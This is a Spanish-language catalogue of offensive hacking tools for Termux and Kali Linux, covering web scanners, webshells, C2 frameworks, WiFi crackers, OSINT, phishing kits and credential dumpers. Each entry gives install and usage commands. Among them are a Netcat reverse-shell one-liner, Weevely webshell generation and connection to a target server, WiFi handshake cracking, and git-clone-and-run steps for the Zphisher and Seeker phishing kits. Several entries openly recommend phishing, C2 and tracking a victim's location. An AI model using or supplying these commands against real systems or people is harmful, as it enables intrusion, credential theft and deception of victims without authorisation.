Herramientas de Hacking

Herramientas para Termux

Red Hawk

Compatibilidad: Termux, Kali Linux
Función: Escaneo de información y vulnerabilidades web.
Descripción: Red Hawk es un todo-en-uno para reconocimiento web: detecta CMS, recopila emails, analiza cabeceras, busca vulnerabilidades XSS, SQLi, y más.
Instalación: git clone https://github.com/Tuhinshubhra/RED_HAWK.git && cd RED_HAWK && php rhawk.php
Ejemplo: php rhawk.php y sigue el menú interactivo.
Ventajas: Muy fácil de usar, resultados rápidos, ideal para bug bounty y pentesting web básico.
Limitaciones: No explota vulnerabilidades, solo las detecta.
Repositorio en GitHub
¿Para qué se puede usar? Reconocimiento web, caza de bugs, análisis de seguridad rápida en sitios pequeños.

Weevely

Compatibilidad: Termux, Kali Linux
Función: Webshell PHP para post-explotación.
Descripción: Weevely permite subir una shell PHP a un servidor vulnerable y controlarlo remotamente desde consola.
Instalación: pip install weevely3 (Termux) | sudo apt install weevely (Kali)
Ejemplo: weevely generate password123 shell.php (genera shell) y weevely http://objetivo.com/shell.php password123 (conecta)
Ventajas: Ligero, fácil de ocultar, comandos avanzados.
Limitaciones: Solo funciona si puedes subir archivos PHP.
Repositorio en GitHub
¿Para qué se puede usar? Post-explotación web, mantener acceso, ejecutar comandos en servidores comprometidos.

Ngrok

Compatibilidad: Termux, Kali Linux, Windows, Mac
Función: Exponer servicios locales a Internet mediante túneles seguros.
Descripción: Ngrok permite crear túneles públicos a puertos locales, ideal para pruebas de phishing, servidores web temporales, o C2.
Instalación: Descargar binario
Ejemplo: ngrok http 8080 (expone un servidor web local en el puerto 8080)
Ventajas: Muy fácil de usar, seguro, enlaces temporales.
Limitaciones: Requiere cuenta para funciones avanzadas, límite de conexiones en plan gratuito.
Sitio oficial
¿Para qué se puede usar? Phishing, pruebas de servidores, C2, acceso remoto temporal.

Herramientas para Kali Linux

Empire

Compatibilidad: Kali Linux, Windows, Mac
Función: Post-explotación y C2 (Command & Control) multiplataforma.
Descripción: Empire es un framework para controlar sistemas comprometidos, ejecutar scripts, y mantener persistencia en redes.
Instalación: git clone https://github.com/BC-SECURITY/Empire.git && cd Empire && ./setup/install.sh
Ejemplo: ./empire (lanzar consola C2)
Ventajas: Muy potente, automatiza tareas de post-explotación, soporte para PowerShell y Python.
Limitaciones: Curva de aprendizaje alta, puede ser detectado por EDR/AV.
Repositorio en GitHub
¿Para qué se puede usar? Red Team, pentesting avanzado, persistencia y control remoto.

Responder

Compatibilidad: Kali Linux
Función: Ataques a redes Windows (captura de hashes NTLM, SMB, etc).
Descripción: Responder permite interceptar y capturar credenciales en redes Windows mediante ataques LLMNR, NBT-NS y MDNS.
Instalación: sudo apt install responder
Ejemplo: responder -I eth0
Ventajas: Muy efectivo en redes mal configuradas, automatiza ataques complejos.
Limitaciones: Solo útil en redes Windows, puede ser detectado por defensas modernas.
Repositorio en GitHub
¿Para qué se puede usar? Pentesting interno, auditoría de redes corporativas, captura de credenciales.

CrackMapExec

Compatibilidad: Kali Linux, Windows
Función: Automatización de ataques a redes Windows (SMB, RDP, WinRM, etc).
Descripción: CrackMapExec permite enumerar, explotar y automatizar ataques en redes Windows, ideal para pentesting interno y Red Team.
Instalación: sudo apt install crackmapexec
Ejemplo: cme smb 192.168.1.0/24 -u admin -p password --shares
Ventajas: Muy potente, automatiza tareas repetitivas, soporte para múltiples protocolos.
Limitaciones: Solo para redes Windows, requiere credenciales válidas para ataques avanzados.
Repositorio en GitHub
¿Para qué se puede usar? Auditoría de redes, explotación de SMB, movimiento lateral.

Herramientas de Hacking WiFi

Aircrack-ng

Compatibilidad: Kali Linux, Termux (limitado)
Función: Cracking de contraseñas WiFi (WEP, WPA, WPA2).
Descripción: Aircrack-ng es la suite más famosa para auditoría y ataque a redes WiFi, permite capturar handshakes y descifrar claves.
Instalación: sudo apt install aircrack-ng (Kali) | pkg install aircrack-ng (Termux, requiere root y adaptador compatible)
Ejemplo: airmon-ng start wlan0 && airodump-ng wlan0mon && aircrack-ng -w rockyou.txt captura.cap
Ventajas: Muy potente, soporta muchos ataques y tarjetas WiFi.
Limitaciones: Requiere hardware compatible, root, y conocimientos avanzados.
Sitio oficial

Wifite

Compatibilidad: Kali Linux, Termux (limitado)
Función: Automatiza ataques a redes WiFi (WEP, WPA, WPS).
Descripción: Wifite automatiza el uso de Aircrack-ng, Reaver, y otras herramientas para atacar redes WiFi con un solo comando.
Instalación: sudo apt install wifite (Kali) | pip install wifite (Termux, requiere root y adaptador compatible)
Ejemplo: wifite
Ventajas: Muy fácil de usar, automatiza ataques complejos.
Limitaciones: Requiere root y hardware compatible.
Repositorio en GitHub

Reaver

Compatibilidad: Kali Linux
Función: Ataques a redes WiFi WPS (fuerza bruta al PIN WPS).
Descripción: Reaver permite obtener la clave WPA/WPA2 de routers vulnerables explotando el protocolo WPS.
Instalación: sudo apt install reaver
Ejemplo: reaver -i wlan0mon -b [BSSID] -vv
Ventajas: Especializado en WPS, automatizado.
Limitaciones: Solo funciona en routers con WPS vulnerable.
Repositorio en GitHub

PixieWPS

Compatibilidad: Kali Linux
Función: Ataque offline a WPS (Pixie Dust Attack).
Descripción: PixieWPS permite romper WPS sin fuerza bruta, usando vulnerabilidades en la generación de PIN.
Instalación: sudo apt install pixiewps
Ejemplo: pixiewps -e [PKE] -s [PKR] -a [AuthKey] -S [E-Hash1] -z [E-Hash2] -v
Ventajas: Muy rápido si el router es vulnerable.
Limitaciones: Solo routers con WPS vulnerable y mala implementación.
Repositorio en GitHub

Kismet

Compatibilidad: Kali Linux
Función: Detección de redes WiFi, Bluetooth y dispositivos inalámbricos.
Descripción: Kismet es un sniffer y detector de redes inalámbricas, útil para descubrir redes ocultas y monitorear el espectro.
Instalación: sudo apt install kismet
Ventajas: Muy completo, detecta redes ocultas y dispositivos IoT.
Limitaciones: Curva de aprendizaje, requiere hardware compatible.
Sitio oficial

Fern Wifi Cracker

Compatibilidad: Kali Linux
Función: Cracking de claves WEP/WPA con interfaz gráfica.
Descripción: Fern es una herramienta gráfica para auditar y atacar redes WiFi, ideal para principiantes.
Instalación: sudo apt install fern-wifi-cracker
Ventajas: Interfaz amigable, automatiza ataques comunes.
Limitaciones: Menos flexible que Aircrack-ng, requiere entorno gráfico.
Repositorio en GitHub

Herramientas OSINT

theHarvester

Compatibilidad: Kali Linux, Termux (con Python)
Función: Recolección de correos, dominios, usuarios y hosts públicos.
Descripción: theHarvester automatiza la búsqueda de información pública en motores como Google, Bing, LinkedIn, etc.
Instalación: sudo apt install theharvester (Kali) | pip install theHarvester (Termux)
Ejemplo: theHarvester -d example.com -b google
Ventajas: Rápido, soporta múltiples fuentes, fácil de usar.
Limitaciones: Resultados limitados por API o motores de búsqueda.
Repositorio en GitHub

Maltego

Compatibilidad: Kali Linux, Windows, Mac
Función: Análisis de relaciones y minería de datos OSINT.
Descripción: Maltego permite visualizar relaciones entre personas, correos, dominios, IPs y redes sociales.
Instalación: Descargar desde la web oficial
Ventajas: Visual, potente, ideal para investigaciones complejas.
Limitaciones: Requiere registro, versión gratuita limitada.
Sitio oficial

Shodan

Compatibilidad: Web, Kali Linux, Termux (API)
Función: Buscador de dispositivos conectados a Internet.
Descripción: Shodan permite encontrar cámaras, routers, servidores y dispositivos IoT expuestos en Internet.
Instalación: Web | pip install shodan (API)
Ejemplo: shodan search apache
Ventajas: Muy potente, acceso a información global en tiempo real.
Limitaciones: Algunas funciones requieren cuenta premium.
Sitio oficial

Herramientas de Ingeniería Social

Social-Engineer Toolkit (SET)

Compatibilidad: Kali Linux
Función: Automatización de ataques de ingeniería social (phishing, clonado de webs, etc).
Descripción: SET es la suite más completa para crear campañas de phishing, ataques de USB, y más.
Instalación: sudo apt install set
Ejemplo: setoolkit
Ventajas: Muy completa, automatiza ataques complejos.
Limitaciones: Solo para fines educativos, requiere conocimientos de redes.
Repositorio en GitHub

Seeker

Compatibilidad: Termux, Kali Linux
Función: Phishing de geolocalización (rastrear ubicación de la víctima).
Descripción: Seeker genera enlaces falsos para obtener la ubicación GPS de la víctima mediante ingeniería social.
Instalación: git clone https://github.com/thewhiteh4t/seeker.git && cd seeker && pip3 install -r requirements.txt && python3 seeker.py
Ventajas: Fácil de usar, resultados en tiempo real.
Limitaciones: Requiere que la víctima acepte compartir ubicación.
Repositorio en GitHub

Zphisher

Compatibilidad: Termux, Kali Linux
Función: Automatización de ataques de phishing a redes sociales y servicios web.
Descripción: Zphisher permite crear páginas de phishing para Facebook, Instagram, Gmail, etc. con un solo comando.
Instalación: git clone https://github.com/htr-tech/zphisher.git && cd zphisher && bash zphisher.sh
Ventajas: Muy fácil de usar, soporta muchos servicios.
Limitaciones: Puede ser detectado por navegadores y antivirus.
Repositorio en GitHub

Criptografía y Post-Explotación

Hashcat

Compatibilidad: Kali Linux, Windows, Mac
Función: Cracking de hashes de contraseñas usando CPU y GPU.
Descripción: Hashcat es la herramienta más rápida para romper hashes de contraseñas, soporta cientos de algoritmos.
Instalación: sudo apt install hashcat
Ejemplo: hashcat -m 0 -a 0 hashes.txt rockyou.txt
Ventajas: Muy rápido, soporte para GPU, gran comunidad.
Limitaciones: Requiere hardware potente, curva de aprendizaje.
Sitio oficial

Mimikatz

Compatibilidad: Windows, Kali Linux (Wine)
Función: Extracción de contraseñas y hashes en sistemas Windows.
Descripción: Mimikatz permite obtener contraseñas en texto claro, hashes y tickets Kerberos de sistemas Windows comprometidos.
Instalación: Descargar binario | wine mimikatz.exe (Kali)
Ventajas: Muy potente para post-explotación, ampliamente usado en pentesting.
Limitaciones: Detectado por antivirus, solo para sistemas Windows.
Repositorio en GitHub

Netcat

Compatibilidad: Kali Linux, Termux
Función: Transferencia de archivos, shells reversas, escaneo de puertos.
Descripción: Netcat es la navaja suiza de las redes, permite conectar, escuchar, transferir y tunelizar datos entre sistemas.
Instalación: sudo apt install netcat (Kali) | pkg install netcat (Termux)
Ejemplo: nc -lvp 4444 (escuchar) | nc IP 4444 -e /bin/bash (shell reversa)
Ventajas: Ligero, versátil, esencial en pentesting.
Limitaciones: Sin cifrado, comandos avanzados pueden ser peligrosos.
